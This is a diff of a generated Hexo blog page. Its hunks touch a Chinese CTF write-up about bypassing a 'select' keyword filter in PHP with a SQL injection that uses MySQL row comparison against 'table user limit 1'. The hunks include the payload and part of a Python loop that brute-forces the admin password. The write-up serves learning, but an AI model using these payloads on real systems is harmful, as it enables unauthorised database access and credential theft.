@@ -59,7 +59,7 @@
   </style>
   <style type="text/css">.site-top .lower nav{display:block !important;}.author-profile i,.post-like a,.post-share .show-share,.sub-text,.we-info a,span.sitename,.post-more i:hover,#pagination a:hover,.post-content a:hover,.float-content i:hover{color:#FE9600}.feature i,.download,.navigator i:hover,.links ul li:before,.ar-time i,span.ar-circle,.object,.comment .comment-reply-link,.siren-checkbox-radio:checked + .siren-checkbox-radioInput:after{background:#FE9600}::-webkit-scrollbar-thumb{background:#FE9600}.download,.navigator i:hover,.link-title,.links ul li:hover,#pagination a:hover,.comment-respond input[type='submit']:hover{border-color:#FE9600}.entry-content a:hover,.site-info a:hover,.comment h4 a,#comments-navi a.prev,#comments-navi a.next,.comment h4 a:hover,.site-top ul li a:hover,.entry-title a:hover,#archives-temp h3,span.page-numbers.current,.sorry li a:hover,.site-title a:hover,i.iconfont.js-toggle-search.iconsearch:hover,.comment-respond input[type='submit']:hover{color:#FE9600}.comments .comments-main{display:block !important;}.comments .comments-hidden{display:none !important;}background-position:center center;background-attachment:inherit;}
   </style>
-<meta name="generator" content="Hexo 5.1.1"></head>
+<meta name="generator" content="Hexo 4.2.1"></head>
 
 <body class="page-template page-template-user page-template-page-analytics page-template-userpage-analytics-php page page-id-1297 chinese-font serif isWebKit">
   <div class="scrollbar" id="bar">
@@ -355,10 +355,10 @@ else
 
 $clean = strtolower($id);
 
-if (strpos($clean, &#39;select&#39;) !== false) &#123;
+if (strpos($clean, &#39;select&#39;) !== false) {
     echo &#39;waf&#39;;
     exit();
-&#125;
+}
 
 var_dump(&quot;select * from news where $id=&#39;$id&#39;&quot;);
 $result = mysqli_query($aaa, &quot;select * from news where id =&#39;$id&#39;&quot;);
@@ -372,7 +372,7 @@ echo &quot;&lt;h2&gt;$content&lt;/h2&gt;&lt;br&gt;&quot;;</code></pre>
 <p><strong>解题思路</strong></p>
 <pre><code class="mysql">select * from news where $id=&#39;$id&#39;</code></pre>
 <p>构造恶意sql语句</p>
-<pre><code class="php">select * from news where $id=&#39;&#39; or (1,&#39;admin&#39;,&#39;&#123;passwd&#125;&#39;) &lt;= (table user limit 1)#</code></pre>
+<pre><code class="php">select * from news where $id=&#39;&#39; or (1,&#39;admin&#39;,&#39;{passwd}&#39;) &lt;= (table user limit 1)#</code></pre>
 <p>大神的文章的语句是使用<code>&lt;</code>来构造恶意语句的，**但我个人换成<code>&lt;=</code>**，原因稍后解释，先了解一下这句语句究竟是如何比较的</p>
 <p>语句<code>table user limit 1</code>的查询结果如下</p>
 <pre><code class="mysql">+----+----------+---------+
@@ -458,7 +458,7 @@ while True:
     for i in range(48, 128):
 
         flag += chr(i)
-        payload = &quot;&#39; or (1,&#39;admin&#39;,&#39;&#123;&#125;&#39;)&lt;=(table user limit 1)%23&quot;.format(flag)
+        payload = &quot;&#39; or (1,&#39;admin&#39;,&#39;{}&#39;)&lt;=(table user limit 1)%23&quot;.format(flag)
         full = url + payload
         r1 = requests.post(full)
 
